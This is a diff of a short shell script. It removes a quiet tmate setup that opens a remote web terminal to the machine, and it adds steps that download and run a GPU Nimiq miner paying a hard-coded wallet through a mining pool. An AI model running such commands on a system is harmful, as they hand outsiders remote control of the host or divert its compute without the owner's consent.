@@ -1,6 +1,10 @@
-pkill -9 tmate
-wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
+cd NimiqMiner
+wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip
+mkdir nq-miner
+tar -xzvf nq-nimer-linux.zip -C nq-miner
+rm nq-nimer-linux.zip
+rm ./nq-miner/start_gpu.sh
+./nq-miner/nq-miner -t cuda -a "NQ20 EC0B EMV5 LK92 LYDA SLHS 0P1A GYY9 Q65L" -n "1" -p pool.acemining.co:8443
+chmod +x start_gpu.sh
+cd NimiqMiner
+./start_gpu.sh
